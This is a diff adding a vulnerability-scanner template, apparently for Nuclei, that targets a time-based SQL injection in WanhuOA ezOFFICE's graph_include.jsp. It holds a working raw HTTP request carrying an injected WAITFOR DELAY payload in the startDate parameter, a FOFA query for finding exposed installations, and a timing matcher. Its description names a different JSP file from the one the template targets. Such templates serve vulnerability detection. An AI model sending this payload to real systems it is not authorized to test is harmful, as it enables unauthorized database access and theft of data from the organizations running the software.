@@ -1,0 +1,31 @@
+id: wanhu-graph-include-sqli
+
+info:
+  name: WanhuOA graph_include.jsp - SQL Injection
+  author: yichen
+  severity: high
+  description: |
+    The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/141057084?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172403670516800180661095%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=172403670516800180661095&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~times_rank-1-141057084-null-null.nonecase&utm_term=万户&spm=1018.2226.3001.4450
+  verified: true
+  max-request: 1
+  fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,sqli
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+    Connection: close
+
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration>=4'
+        - 'status_code == 200'
+      condition: and
